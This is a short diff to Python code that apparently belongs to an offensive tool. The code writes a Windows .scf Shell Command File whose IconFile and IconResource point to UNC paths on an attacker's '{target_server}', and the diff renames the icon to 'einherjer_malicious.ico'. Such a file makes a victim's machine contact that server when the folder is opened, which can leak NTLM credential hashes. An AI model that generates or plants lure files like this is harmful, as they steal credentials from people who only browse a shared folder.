@@ -11,7 +11,7 @@ IconResource=\\{target_server}\aa"""
 
     scf_file = f"""[Shell]
 Command=2
-IconFile=\\{target_server}\tools\nc.ico
+IconFile=\\{target_server}\tools\einherjer_malicious.ico
 [Taskbar]
 Command=ToggleDesktop"""
 
